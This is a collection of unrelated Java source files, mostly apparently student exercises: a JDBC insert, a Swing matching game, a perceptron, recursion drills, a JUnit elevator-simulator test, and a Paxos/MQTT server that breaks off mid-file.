    "import java.sql.*;\n\npublic class DepartmentDatabase {\n    \n    private static final String URL = \"jdbc:oracle:thin:@localhost:1521:XE\";\n    private static final String USERNAME = \"gowri\";\n    private static final String PASSWORD = \"123456\";\n\n\n    static class Department {\n        private int id;\n        private String name;\n\n        public Department(int id, String name) {\n            this.id = id;\n            this.name = name;\n        }\n\n        public int getId() {\n            return id;\n        }\n\n        public String getName() {\n            return name;\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            \n            Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);\n\n\n            insertDepartment(connection, new Department(1, \"IT\"));\n\n           \n            connection.close();\n            System.out.println(\"Department inserted successfully.\");\n        } \n\t\tcatch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void insertDepartment(Connection connection, Department department) throws SQLException {\n        String query = \"INSERT INTO department (id, name) VALUES (?, ?)\";\n        PreparedStatement statement = connection.prepareStatement(query);\n        statement.setInt(1, department.getId());\n        statement.setString(2, department.getName());\n        statement.executeUpdate();\n        statement.close();\n    }\n}",
    "package controller;\r\n\r\nimport java.awt.Color;\r\nimport java.awt.Dimension;\r\nimport java.awt.GridLayout;\r\nimport java.awt.Image;\r\nimport java.awt.event.ActionEvent;\r\nimport java.awt.event.ActionListener;\r\nimport java.awt.Point;\r\n\r\nimport javax.swing.Icon;\r\nimport javax.swing.ImageIcon;\r\nimport javax.swing.JButton;\r\nimport javax.swing.JPanel;\r\nimport javax.swing.border.EmptyBorder;\r\nimport javax.swing.border.LineBorder;\r\n\r\npublic class ButtonEvent extends JPanel implements ActionListener {\r\n\t\r\n\tprivate static final long serialVersionUID = 1L;\r\n\tprivate int row;\r\n\tprivate int col;\r\n\tprivate int score = 0;\r\n\tprivate int bound = 2;\r\n\tprivate int size = 50;\r\n\tprivate Point p1 = null;\r\n\tprivate Point p2 = null;\r\n\tprivate JButton[][] btn;\r\n\tprivate Controller algorithm;\r\n\tprivate Color backGroundColor = Color.lightGray;\r\n\tprivate MainFrame frame;\r\n\tprivate PointLine line;\r\n\tprivate int item;\r\n\r\n\tpublic ButtonEvent(MainFrame frame, int row, int col) {\r\n\t\tthis.frame = frame;\r\n\t\tthis.row = row + 2;\r\n\t\tthis.col = col + 2;\r\n\t\titem = row * col / 2;\r\n\r\n\t\tsetLayout(new GridLayout(row, col, bound, bound));\r\n\t\tsetBackground(backGroundColor);\r\n\t\tsetPreferredSize(new Dimension((size + bound) * col, (size + bound) * row));\r\n\t\tsetBorder(new EmptyBorder(10, 10, 10, 10));\r\n\t\tsetAlignmentY(JPanel.CENTER_ALIGNMENT);\r\n\r\n\t\tnewGame();\r\n\r\n\t}\r\n\r\n\tpublic void newGame() {\r\n\t\talgorithm = new Controller(this.frame, this.row, this.col);\r\n\t\taddArrayButton();\r\n\r\n\t}\r\n\r\n\tprivate void addArrayButton() {\r\n\t\tbtn = new JButton[row][col];\r\n\t\tfor (int i = 1; i < row - 1; i++) {\r\n\t\t\tfor (int j = 1; j < col - 1; j++) {\r\n\t\t\t\tbtn[i][j] = createButton(i + \",\" + j);\r\n\t\t\t\tIcon icon = getIcon(algorithm.getMatrix()[i][j]);\r\n\t\t\t\tbtn[i][j].setIcon(icon);\r\n\t\t\t\tadd(btn[i][j]);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tprivate Icon getIcon(int index) {\r\n\t\tint width = 48, height = 48;\r\n\t\tImage image = new ImageIcon(getClass().getResource(\"/icon/\" + index + \".png\")).getImage();\r\n\t\tIcon icon = new ImageIcon(image.getScaledInstance(width, height, image.SCALE_SMOOTH));\r\n\t\treturn icon;\r\n\r\n\t}\r\n\t\r\n\tprivate JButton createButton(String action) {\r\n\t\tJButton btn = new JButton();\r\n\t\tbtn.setActionCommand(action);\r\n\t\tbtn.setBorder(null);\r\n\t\tbtn.addActionListener(this);\r\n\t\treturn btn;\r\n\t}\r\n\r\n\tpublic void execute(Point p1, Point p2) {\r\n\t\tSystem.out.println(\"Detele\");\r\n\t\tsetDisable(btn[p1.x][p1.y]);\r\n\t\tsetDisable(btn[p2.x][p2.y]);\r\n\t}\r\n\r\n\tpublic void setDisable(JButton btn) {\r\n\t\tbtn.setIcon(null);\r\n\t\tbtn.setBackground(backGroundColor);\r\n\t\tbtn.setEnabled(false);\r\n\t}\r\n\r\n\t@Override\r\n\tpublic void actionPerformed(ActionEvent e) {\r\n\t\tString btnIndex = e.getActionCommand();\r\n\t\tint indexDot = btnIndex.lastIndexOf(\",\");\r\n\t\tint x = Integer.parseInt(btnIndex.substring(0, indexDot));\r\n\t\tint y = Integer.parseInt(btnIndex.substring(indexDot + 1, btnIndex.length()));\r\n\r\n\t\tif (p1 == null) {\r\n\t\t\tp1 = new Point(x, y);\r\n\t\t\tbtn[p1.x][p1.y].setBorder(new LineBorder(Color.red));\r\n\t\t} else {\r\n\t\t\tp2 = new Point(x, y);\r\n\t\t\tSystem.out.println(\"(\" + p1.x + \",\" + p1.y + \") --> (\" + p2.x + \";\" + p2.y + \")\");\r\n\t\t\tline = algorithm.checkTwoPoint(p1, p2);\r\n\r\n\t\t\tif (line != null) {\r\n\t\t\t\tSystem.out.println(\"line != null\");\r\n\t\t\t\talgorithm.getMatrix()[p1.x][p1.y] = 0;\r\n\t\t\t\talgorithm.getMatrix()[p2.x][p2.y] = 0;\r\n\t\t\t\talgorithm.showMatrix();\r\n\t\t\t\texecute(p1, p2);\r\n\t\t\t\tline = null;\r\n\t\t\t\tscore += 10;\r\n\t\t\t\titem--;\r\n\t\t\t\tframe.time++;\r\n\t\t\t\tframe.lbScore.setText(score + \"\");\r\n\t\t\t}\r\n\r\n\t\t\tbtn[p1.x][p1.y].setBorder(null);\r\n\t\t\tp1 = null;\r\n\t\t\tp2 = null;\r\n\t\t\tSystem.out.println(\"Done\");\r\n\t\t\tif (item == 0) {\r\n\t\t\t\tframe.showDialogNewGame(\"You are Winer!\\nDo you want play again?\", \"Win\", 1);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t}\r\n}\r\n",
    "package com.comfama.comfama.mappers;\n\nimport com.comfama.comfama.dtos.ApplicationDTO;\nimport com.comfama.comfama.entities.Application;\n\npublic class ApplicationMapper {\n    public static ApplicationDTO toDTO(Application application) {\n        ApplicationDTO dto = new ApplicationDTO();\n        dto.setApplicationId(application.getApplicationId());\n        dto.setApplicantId(application.getApplicant() != null ? application.getApplicant().getApplicantId() : null);\n        dto.setProjectDescription(application.getProjectDescription());\n        dto.setStatus(application.getStatus());\n        dto.setSubmissionDate(application.getSubmissionDate());\n        return dto;\n    }\n\n    public static Application toEntity(ApplicationDTO dto) {\n        Application application = new Application();\n        application.setApplicationId(dto.getApplicationId());\n        application.setProjectDescription(dto.getProjectDescription());\n        application.setStatus(dto.getStatus());\n        application.setSubmissionDate(dto.getSubmissionDate());\n        return application;\n    }\n}\n",
    "/**\n * File: [OOP_ClassRelationship_HAS_A_RonakBasnet].\n * By: [Ronak Basnet]\n * Date: [3/31/2024]\n * Description: [This program prints OOP]\n */\n\n\npublic class OOP_ClassRelationship_HAS_A_RonakBasnet {\n\n    public static void main(String[] args) {\n\n        Driver access = new Driver();\n\n        access.carDetail();\n        access.planeDetail();\n        access.busDetail();\n        access.diagram();\n\n\n    }\n}\n\nclass Driver {\n    Vehicle vehicle = new Vehicle();\n\n    public void carDetail() {\n        System.out.println(\"----------------------------\");\n        System.out.println(\"--Car Details--\" + \"            |\");\n        vehicle.car.smallWheels();\n        vehicle.car.smallWindows();\n    }\n\n    public void planeDetail() {\n        System.out.println(\"--Plane Details--\" + \"          |\");\n        vehicle.plane.wings();\n        vehicle.plane.bathroom();\n    }\n\n    public void busDetail() {\n        System.out.println(\"--Bus Details--\" + \"            |\");\n        vehicle.bus.bigWheels();\n        vehicle.bus.multipleSeats();\n    }\n\n    public void diagram() {\n        System.out.println(\"--Diagram of the classes--\\n\");\n        System.out.print(\"  | OOP_ClassRelationship_HAS_A_RonakBasnet |\\n\");\n        int height = 3; // Height of the arrow\n\n        // Draw the arrow\n        for (int i = 1; i <= height; i++) {\n            System.out.println(\"                      *\");\n        }\n        System.out.println(\"                   |Driver|\");\n        for (int i = 1; i <= height; i++) {\n            System.out.println(\"                      *\");\n        }\n        System.out.println(\"                  |Vehicle|\");\n        for (int i = 1; i <= height; i++) {\n            System.out.println(\"                      *\");\n        }\n\n        System.out.printf(\"%18s\", \"  * * * * * * * * * * * * * * * * * * * * * * *\");\n        System.out.println();\n\n        System.out.printf(\"  *%20s %23s\", \"*\", \"*\");\n        System.out.println();\n        System.out.printf(\"  *%20s %23s\\n\", \"*\", \"*\");\n\n        System.out.println(\"|Car|              |Plane|                  |Bus|\");\n\n\n    }\n\n}\n\nclass Vehicle {\n    public Car car = new Car();\n    public Plane plane = new Plane();\n    public Bus bus = new Bus();\n\n\n}\n\n//What does a car have that others do not?\nclass Car {\n\n    // 2 methods here\n    public void smallWheels() {\n        System.out.println(\"The Car has small wheels.\" + \"  |\");\n\n    }\n\n    public void smallWindows() {\n        System.out.println(\"The Car has small windows.\" + \" |\");\n    }\n\n}\n\n//What does a plane have that others do not?\nclass Plane {\n    //2 methods here\n    public void wings() {\n        System.out.println(\"The Plane has wings.\" + \"       |\");\n    }\n\n    public void bathroom() {\n        System.out.println(\"The Plane has a bathroom.\" + \"  |\");\n    }\n\n}\n\n//What does a bus have that others do not?\nclass Bus {\n    //2 methods here\n    public void bigWheels() {\n        System.out.println(\"The Bus has big wheels.\" + \"    |\");\n    }\n\n    public void multipleSeats() {\n        System.out.println(\"The Bus has multiple seats.\" + \"|\");\n        for (int i = 0; i < 28; i++) {\n            System.out.print(\"-\");\n        }\n        System.out.println();\n    }\n\n}\n\n\n\n\n",
    "public class TestData {\n  private String cumulativeGPA;\n  private String TestDate;\n  private String SATTotal;\n  private String SATEBRW;\n  private String SATMath;\n  private String PSATTotal;\n  private String PSATEBRW;\n  private String PSATMath;\n\n  public TestData(String cumulativeGPA, String TestDate, String SATTotal, String SATEBRW, String SATMath, String PSATTotal, String PSATEBRW, String PSATMath) {\n    this.cumulativeGPA = cumulativeGPA;\n    this.TestDate = TestDate;\n    this.SATTotal = SATTotal;\n    this.SATEBRW = SATEBRW;\n    this.SATMath = SATMath;\n    this.PSATTotal = PSATTotal;\n    this.PSATEBRW = PSATEBRW;\n    this.PSATMath = PSATMath;\n  }\n  \n  public String getcumulativeGPA() {\n    return cumulativeGPA;\n  }\n  public String getTestDate() {\n    return TestDate;\n  }\n  public String getSATTotal() {\n    return SATTotal;\n  }\n  public String getSATEBRW() {\n    return SATEBRW;\n  }\n  public String getSATMath() {\n    return SATMath;\n  }\n  public String getPSATTotal() {\n    return PSATTotal;\n  }\n  public String getPSATEBRW() {\n    return PSATEBRW;\n  }\n  public String getPSATMath() {\n    return PSATMath;\n  }\n\n\n  public int DateConverToInt(){\n    return Integer.parseInt(TestDate.substring(6)+TestDate.substring(0,2)+TestDate.substring(3,5));\n  }\n  \n  public void setcumulativeGPA(String c) {\n    cumulativeGPA = c;\n  }\n  public void setTestDate(String c) {\n    TestDate = c;\n  }\n  public void setSATTotal(String c) {\n    SATTotal = c;\n  }\n  public void setSATEBRW(String c) {\n    SATEBRW = c;\n  }\n  public void setSATMath(String c) {\n    SATMath = c;\n  }\n  public void setPSATTotal(String c) {\n    PSATTotal = c;\n  }\n  public void setPSATEBRW(String c) {\n    PSATEBRW = c;\n  }\n  public void setPSATMath(String c) {\n    PSATMath = c;\n  }\n}",
    "/*\nimport java.util.Scanner;\npublic class Main {\n    public static void main(String[] args)\n    {\n        Scanner scanner = new Scanner(System.in);\n        int n = scanner.nextInt();\n        scanner.close();\n        int result = squaresum(n);\n        System.out.println(result);\n    }\n    public static int squaresum(int n)\n    {\n        if(n==1)\n        {\n            return 1;\n        }\n        else\n        {\n            return n*n+squaresum(n-1);\n        }\n    }\n}*/\n\n/*\nimport java.util.Scanner;\npublic class Main\n{\n    public static void main(String[] args)\n    {\n        Scanner scanner = new Scanner(System.in);\n        int size = scanner.nextInt();\n        int[] array = new int[size];\n        for (int i = 0; i < size; i++) {\n            array[i] = scanner.nextInt();\n        }\n        int n = scanner.nextInt();\n        scanner.close();\n        int result = sum(array,n);\n        System.out.println(result);\n    }\n    public static int sum(int[] array, int n)\n    {\n        if (n<=0 || array.length==0)\n        {\n            return 0;\n        }\n        else\n        {\n            return array[n-1] + sum(array, n-1);\n        }\n    }\n}*/\n\nimport java.util.Scanner;\npublic class Main\n{\n    public static void main(String[] args)\n    {\n        Scanner scanner = new Scanner(System.in);\n        int n = scanner.nextInt();\n        int result = sum(n);\n        System.out.println(result);\n    }\n    public static int sum(int n)\n    {\n        if (n==1)\n        {\n            return 1;\n        }\n        else\n        {\n            return n + sum(n-1);\n        }\n    }\n}\n\n",
    "package application;\n\t\nimport javafx.application.Application;\nimport javafx.stage.Stage;\nimport javafx.scene.Group;\nimport javafx.scene.Scene;\nimport javafx.scene.image.Image;\nimport javafx.scene.input.KeyCombination;\nimport javafx.scene.layout.BorderPane;\nimport javafx.scene.paint.Color;\n\n\npublic class Main extends Application {\n\n\t\n\tpublic static void main(String[] args) {\n\t\tlaunch(args);\n\t}\n\n\t@Override\n\tpublic void start(Stage stage) throws Exception {\n\t\t//Stage stage = new Stage(); this make a new stage\n\t\tGroup root = new Group();\n\t\tScene scene = new Scene(root,Color.BROWN);\n\t\t\n\t\tImage icon = new Image(\"jb_FX.png\");\n\t\tstage.getIcons().add(icon);\n\t\tstage.setTitle(\"First FX Stage -Woot Woot!!\");\n\t\tstage.setWidth(420);\n\t\tstage.setHeight(420);\n\t\tstage.setResizable(false);\n\t\t//stage.setX(50);\n\t\t//stage.setY(50);\n\t\tstage.setFullScreen(true);\n\t\tstage.setFullScreenExitHint(\"YOU CANT ESCAPE UNLESS YOU PRESS q\");\n\t\tstage.setFullScreenExitKeyCombination(KeyCombination.valueOf(\"q\"));\n\t\t\n\t\tstage.setScene(scene);\n\t\tstage.show();\n\t}\n}\n",
    "public class MultiPerceptron {\n    // Stores the weights vectors for each class.\n    private Perceptron[] perceptrons;\n    private int numClasses; // Number m of classes in the MultiPerceptron\n    private int n; // Length of the input feature vector.\n\n    // Creates a multi-perceptron object with m classes and n inputs.\n    // It creates an array of m perceptrons, each with n inputs.\n    public MultiPerceptron(int m, int n) {\n        numClasses = m;\n        this.n = n;\n\n        perceptrons = new Perceptron[m];\n        for (int i = 0; i < m; i++) {\n            perceptrons[i] = new Perceptron(n);\n        }\n    }\n\n    // Returns the number of classes m.\n    public int numberOfClasses() {\n        return numClasses;\n    }\n\n    // Returns the number of inputs n (length of the feature vector).\n    public int numberOfInputs() {\n        return n;\n    }\n\n    // Returns the predicted class label (between 0 and m-1) for the given input.\n    public int predictMulti(double[] x) {\n        int classPrediction = 0;\n        double weightedSum = perceptrons[0].weightedSum(x);\n\n        // Iterates through every element in the perceptrons array.\n        for (int i = 0; i < numClasses; i++) {\n            // Stores the weighted sum of each perceptron and compares.\n            double tempSum = perceptrons[i].weightedSum(x);\n\n            // Stores the class prediction and largest weighted sum.\n            if (tempSum > weightedSum) {\n                classPrediction = i;\n                weightedSum = tempSum;\n            }\n        }\n        return classPrediction;\n    }\n\n    // Trains this multi-perceptron on the labeled (between 0 and m-1) input.\n    public void trainMulti(double[] x, int classLabel) {\n        // Iterates through the MultiPerceptron array.\n        for (int i = 0; i < numClasses; i++) {\n            // if false negative prediction, change weights values of the class\n            if (i == classLabel)\n                perceptrons[i].train(x, 1);\n\n            // if false positive prediction, change weights values of the class\n            if (i != classLabel)\n                perceptrons[i].train(x, -1);\n        }\n    }\n\n    // Returns a String representation of this MultiPerceptron, with\n    // the string representations of the perceptrons separated by commas\n    // and enclosed in parentheses.\n    // Example with m = 2 and n = 3: ((2.0, 0.0, -2.0), (3.0, 4.0, 5.0))\n    public String toString() {\n        String representation = \"(\";\n        for (int i = 0; i < numClasses; i++) {\n            if (i == (numClasses - 1))\n                representation += perceptrons[i].toString();\n            else\n                representation += perceptrons[i].toString() + \", \";\n        }\n        return representation + \")\";\n    }\n\n    // Tests this class by directly calling all instance methods.\n    public static void main(String[] args) {\n        int m = 2;\n        int n = 3;\n\n        // Training the MultiPerceptron.\n        double[] training1 = { 3.0, 4.0, 5.0 };  // class 1\n        double[] training2 = { 2.0, 0.0, -2.0 };  // class 0\n        double[] training3 = { -2.0, 0.0, 2.0 };  // class 1\n        double[] training4 = { 5.0, 4.0, 3.0 };  // class 0\n\n        MultiPerceptron perceptron = new MultiPerceptron(m, n);\n        StdOut.println(perceptron);\n        perceptron.trainMulti(training1, 1);\n        StdOut.println(perceptron);\n        perceptron.trainMulti(training2, 0);\n        StdOut.println(perceptron);\n        perceptron.trainMulti(training3, 1);\n        StdOut.println(perceptron);\n        perceptron.trainMulti(training4, 0);\n        StdOut.println(perceptron);\n\n        StdOut.println(\"Number of Classes: \" + perceptron.numberOfClasses());\n        StdOut.println(\"Number of Inputs: \" + perceptron.numberOfInputs());\n\n        // Testing the MultiPerceptron.\n        double[] testing1 = { -1.0, -2.0, 3.0 };\n        double[] testing2 = { 2.0, -5.0, 1.0 };\n\n        StdOut.println(perceptron.predictMulti(testing1));\n        StdOut.println(perceptron);\n        StdOut.println(perceptron.predictMulti(testing2));\n        StdOut.println(perceptron);\n    }\n}\n",
    "import static org.junit.jupiter.api.Assertions.assertTrue;\n\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\nimport java.util.ArrayList;\n\nimport org.junit.jupiter.api.AfterAll;\nimport org.junit.jupiter.api.AfterEach;\nimport org.junit.jupiter.api.BeforeAll;\nimport org.junit.jupiter.api.BeforeEach;\nimport org.junit.jupiter.api.MethodOrderer.OrderAnnotation;\nimport org.junit.jupiter.api.Order;\nimport org.junit.jupiter.api.Test;\nimport org.junit.jupiter.api.TestMethodOrder;\n\nimport building.Building;\nimport myfileio.MyFileIO;\n\n@TestMethodOrder(OrderAnnotation.class)\nclass BuildingFSMPolTest {\n\tprivate ElevatorSimController c;\n\tprivate Building b;\n\tprivate MyFileIO fio = new MyFileIO();\n\tprivate static boolean DEBUG = false;\n\tprivate static String os = null;\n\tprivate static String javaHome = null;\n\tprivate ElevatorLogCompare cmpLog = new ElevatorLogCompare();\n\tprivate static String test = \"\";\n\n\tprivate void updateSimConfigCSV(String fname) {\n\t\tFile fh = fio.getFileHandle(\"ElevatorSimConfig.csv\");\n\t\tString line = \"\";\n\t\tArrayList<String> fileData = new ArrayList<>();\n\t\ttry {\n\t\t\tBufferedReader br = fio.openBufferedReader(fh);\n\t\t\twhile ( (line = br.readLine())!=null) {\n\t\t\t\tif (line.matches(\"passCSV.*\")) \n\t\t\t\t\tfileData.add(\"passCSV,\"+fname);\n\t\t\t\telse\n\t\t\t\t\tfileData.add(line);\n\t\t\t}\n\t\t\tfio.closeFile(br);\n\t\t\tBufferedWriter bw = fio.openBufferedWriter(fh);\n\t\t\tfor (String l : fileData)\n\t\t\t\tbw.write(l+\"\\n\");\n\t\t\tfio.closeFile(bw);\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n\t\n\tprivate void copyTestFile(String fname) {\n\t\tFile ifh = fio.getFileHandle(\"test_data/\"+fname);\n\t\tFile ofh = fio.getFileHandle(fname);\n\t\tPath src = Paths.get(ifh.getPath());\n\t\tPath dest = Paths.get(ofh.getPath());\n\t\ttry {\n\t\t\tFiles.copy(src, dest,StandardCopyOption.REPLACE_EXISTING);\n\t\t} \n\t\tcatch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\tupdateSimConfigCSV(fname);\n\t}\n\t\n\tprivate void deleteTestCSV(String fname) {\n\t\tMyFileIO fio = new MyFileIO();\n\t\tFile ifh = fio.getFileHandle(fname);\n\t\tifh.delete();\n\t\tifh = fio.getFileHandle(fname.replaceAll(\".csv\", \"PassData.csv\"));\n\t\tifh.delete();\n\t}\n\n\t\n\tprivate static void deleteTestLog(String fname) {\n\t\tMyFileIO fio = new MyFileIO();\n\t\tFile fh = fio.getFileHandle(fname);\n\t\tif (fh.exists()) {\n\t\t\tboolean status = fh.delete();\n\t\t\tif (!status) {\n\t\t\t\tSystem.out.println(\"Warning: Unable to delete \"+fname+\"\\n\"+\n\t\t\t\t\t\t\"       You should remove this manually or cmpElevator results\\n\"+\n\t\t\t\t\t\t\"       may be incorrect\\n\");\n\t\t\t}\n\t\t} \t\t\n\t}\n\t\n    private static String getOperatingSystem() {\n    \tos = System.getProperty(\"os.name\");\n    \treturn os;\n    }\n\n    private static void getJavaHome() {\n    \tFile fh = null;\n    \tjavaHome = System.getProperty(\"java.home\").replaceAll(\"jre\",\"bin\");\n\t\tif (DEBUG) System.out.println(\"JavaHome: \"+javaHome);\n\t\tfh = new File(javaHome);\n\t\tif (!fh.exists()) \n\t\t\tjavaHome = null;\n    }\n\n    private void moveCmpFiles(String base) {\n    \tFile ifh = new File(base+\".log\");\n    \tFile ofh = new File(\"JUnitTestLogs/\"+base+\".log\");\n\t\tPath src = Paths.get(ifh.getPath());\n\t\tPath dest = Paths.get(ofh.getPath());\n\t\ttry {\n\t\t\tFiles.move(src,dest,StandardCopyOption.REPLACE_EXISTING);\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n    \tifh = new File(base+\".cmp\");\n    \tofh = new File(\"JUnitTestLogs/\"+base+\".cmp\");\n\t\tsrc = Paths.get(ifh.getPath());\n\t\tdest = Paths.get(ofh.getPath());\n\t\ttry {\n\t\t\tFiles.move(src,dest,StandardCopyOption.REPLACE_EXISTING);\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\n    }\n    \n\t@BeforeAll\n\tstatic void setUpBeforeClass() throws Exception {\n\t\tSystem.out.println(\"Running on: \"+getOperatingSystem());\n\t\tgetJavaHome();\n\t\tFile ifh = new File(\"ElevatorSimConfig.csv\");\n\t\tFile ofh = new File(\"ElevatorSimConfig.save\");\n\t\tPath src = Paths.get(ifh.getPath());\n\t\tPath dest = Paths.get(ofh.getPath());\n\t\tFiles.copy(src, dest,StandardCopyOption.REPLACE_EXISTING);\n\t\tifh = new File(\"JUnitTestLogs\");\n\t\tif (!ifh.exists()) {\n\t\t\tifh.mkdir();\n\t\t\tSystem.out.println(\"Created file: JUnitTestLogs\");\n\t\t}\n\t}\n\n\t@AfterAll\n\tstatic void tearDownAfterClass() throws Exception {\n\t\tFile ifh = new File(\"ElevatorSimConfig.save\");\n\t\tFile ofh = new File(\"ElevatorSimConfig.csv\");\n\t\tPath src = Paths.get(ifh.getPath());\n\t\tPath dest = Paths.get(ofh.getPath());\n\t\tFiles.copy(src, dest,StandardCopyOption.REPLACE_EXISTING);\n\t\tifh.delete();\n\t}\n\t\n\t@BeforeEach\n\tvoid setUp() throws Exception {\n\t}\n\n\t@AfterEach\n\tvoid tearDown() throws Exception {\n\t\tdeleteTestLog(test+\".log\");\n\t}\n\n\tprivate void copyLogFiles(String base) {\n    \tFile ifh = new File(base+\".log\");\n    \tFile ofh = new File(\"JUnitTestLogs/\"+base+\".log\");\n\t\tPath src = Paths.get(ifh.getPath());\n\t\tPath dest = Paths.get(ofh.getPath());\n\t\ttry {\n\t\t\tFiles.copy(src,dest,StandardCopyOption.REPLACE_EXISTING);\n\t\t}\n\t\tcatch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t}\t\t\n\t}\n\t\n\t",
    "public class Person {\n\n    private String firstName;\n    private String middleName;\n    private String lastName;\n    private String email;\n    private int age;\n    private String occupation;\n\n\n    public Person(String firstName, String middleName, String lastName, String email, int age, String occupation) {\n        this.firstName = firstName;\n        this.middleName = middleName;\n        this.lastName = lastName;\n        this.email = email;\n        this.age = age;\n        this.occupation = occupation;\n    }\n\n\n    public String getFirstName() {\n        return this.firstName;\n    }\n\n    public void setFirstName(String firstName) {\n        this.firstName = firstName;\n    }\n\n    public String getMiddleName() {\n        return this.middleName;\n    }\n\n    public void setMiddleName(String middleName) {\n        this.middleName = middleName;\n    }\n\n    public String getLastName() {\n        return this.lastName;\n    }\n\n    public void setLastName(String lastName) {\n        this.lastName = lastName;\n    }\n\n    public String getEmail() {\n        return this.email;\n    }\n\n    public void setEmail(String email) {\n        this.email = email;\n    }\n\n    public int getAge() {\n        return this.age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public String getOccupation() {\n        return this.occupation;\n    }\n\n    public void setOccupation(String occupation) {\n        this.occupation = occupation;\n    }\n\n    \n}\n\n\n/* \n * ======================\nBanking System \ud83c\udfe6\ud83d\udcb5\n======================\n\ud83e\uddd1\ud83c\udffbPerson Class                          \n    ATTRIBUTES\n        - First Name\n        - Middle Name\n        - Last Name\n        - Email\n        - Age\n        - Occupation\n    Methods\n        - Constructor\n        - Getters and Setters\n\n\n\ud83d\udca3Problem Description\n    You are tasked to implement a simple banking system. \n        - If the email is incorrect, ask the user again until valid email is met.\n        - If the user inputted wrong PIN 3 times, the user must be blocked (Exit the System)\n        - STRICTLY FOLLOW THE OOP Principles\n\n */",
    "package paxos_pack;\n\nimport framework.*;\nimport Application.*;\nimport framework.Timer;\nimport org.eclipse.paho.client.mqttv3.*;\nimport org.eclipse.paho.client.mqttv3.persist.MemoryPersistence;\nimport java.io.*;\nimport java.util.*;\n\nimport static java.lang.Thread.sleep;\nimport static paxos_pack.HelperFunc.*;\n\npublic class Server {\n    private static final String CONFIG_FILE_NAME = \"mqtt-config.properties\";\n    private static MqttClient server;\n    private static Properties config;\n\n    //mqtt info\n    String broker = \"tcp://127.0.0.1:1883\";\n    int qos = 0;\n    String serverId;\n//    MqttClient server;\n    //config\n    int serverNum;\n    String serverName;\n    List<String> serverID_list = new ArrayList<String>();\n    int clientNum;\n    List<String> clientID_list = new ArrayList<String>();\n    /*--------------------paxos------------------------*/\n    int serverIndex;\n    private AMOApplication<Application> amoApplication;\n    // paxos log related constants\n    private int currBallotNum;\n    private String currentLeader;\n    private int slotIn = 1; // slot in should start with 1 as per the definition.\n    private int slotOut = 1;\n    private int lastExecutedSlotNum = 0;\n    private int proposalCount = 0;\n    private TreeMap<Integer, LogEntry> paxosLog;\n    private HashMap<Integer, Set<String>> acceptedServers; // acceptedCounts For each slot.\n\n    // Election\n    private HashSet<String> acceptedProposals;\n    private int heartBeatNum = 0;\n    private enum State {\n        ACCEPTOR, LEADER, RUNNING\n    }\n    private State currState;\n\n    //garbage collection\n    private HashMap<String, Integer> ServersGarbageResponse;\n    private int cnt;\n\n    // leader health\n    private boolean IS_LEADER_ALIVE = false;\n    private enum LeaderState {\n        ALIVE, WAIT, DEAD\n    }\n    private LeaderState currLeaderState;\n\n    //timers\n    LeaderElectionTimer leaderElectionTimer;\n    CheckLeaderTimer checkLeaderTimer;\n    HeartBeatTimer heartBeatTimer;\n\n\n    public Server(){\n        serverId = MqttClient.generateClientId();\n        this.amoApplication = new AMOApplication<>((Application) new KVStore());\n    }\n    /*------------------------connection----------------------*/\n    public void sizeConfig () throws IOException {\n        String parentPath = System.getProperty(\"user.dir\")+\"/files/\";\n        String ServerConfigPath = parentPath+\"sizeConfig.txt\";\n        BufferedReader in1 = new BufferedReader(new FileReader(ServerConfigPath));\n        String[] sizes = (in1.readLine()).split(\" \");\n        serverNum = Integer.parseInt(sizes[0]);\n        clientNum = Integer.parseInt(sizes[1]);\n    }\n\n    public void serverConfig_Sub() throws IOException, InterruptedException, MqttException {\n        String parentPath = System.getProperty(\"user.dir\")+\"/files/\";\n        String ServerConfigPath = parentPath+\"serverConfig.txt\";\n        BufferedReader in1 = new BufferedReader(new FileReader(ServerConfigPath));\n//        serverNum = Integer.parseInt(in1.readLine());\n        int count_index = 0;\n        String readServer;\n        while ((readServer = in1.readLine()) != null) {\n            count_index++;\n        }\n        serverName=\"server\"+(count_index+1);\n        serverIndex = count_index+1;\n        String serverName_modify;\n        if(serverName.equals(\"server3\")){\n            serverName_modify = serverName;\n        }\n        else {\n            serverName_modify = serverName+\"\\n\";\n        }\n        BufferedWriter out = new BufferedWriter(new FileWriter(ServerConfigPath,true));\n        out.write(serverName_modify);\n        out.close();\n        //wait for all server arrives\n        int serverCount = 0;\n        while(serverCount < serverNum){\n            serverCount = 0;\n            BufferedReader in2 = new BufferedReader(new FileReader(ServerConfigPath));\n            String readServer2;\n            while ((readServer2 = in2.readLine()) != null) {\n                serverCount++;\n            }\n            sleep(1000);\n        }\n        //all server arrives, put servers' name in the system\n        BufferedReader in3 = new BufferedReader(new FileReader(ServerConfigPath));\n//        in3.readLine();\n        String readServer3;\n        while ((readServer3 = in3.readLine()) != null) {\n//            if(!readServer3.equals(serverName)) {\n            serverID_list.add(readServer3);\n//            }\n        }\n//        for (int i = 0; i < serverID_list.size(); i++) {\n//            System.out.println(serverID_list.get(i));\n//        }\n        for (int i = 0; i < serverNum; i++) {\n            String topic = serverID_list.get(i) + \"_\" + serverName;\n            server.subscribe(topic);\n            System.out.println(\"subscribe \"+topic);\n        }\n    }\n    public void clientConfig_Sub() throws IOException, InterruptedException, MqttException {\n        String parentPath = System.getProperty(\"user.dir\")+\"/files/\";\n        String ClientConfigPath = parentPath+\"clientConfig.txt\";\n        //read client config\n//        BufferedReader client_in1 = new BufferedReader(ne",
